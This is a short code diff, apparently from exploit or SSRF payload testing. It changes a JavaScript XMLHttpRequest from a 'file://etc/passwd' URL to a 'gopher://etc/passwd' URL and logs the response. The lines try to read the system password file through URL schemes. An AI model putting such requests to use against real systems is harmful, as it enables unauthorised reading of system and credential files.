@@ -22,7 +22,7 @@
         }
         
         var request = makeHttpObject();
-        request.open("GET", "file://etc/passwd", true);
+        request.open("GET", "gopher://etc/passwd", true);
         request.send(null);
         console.log(request.responseText)
     
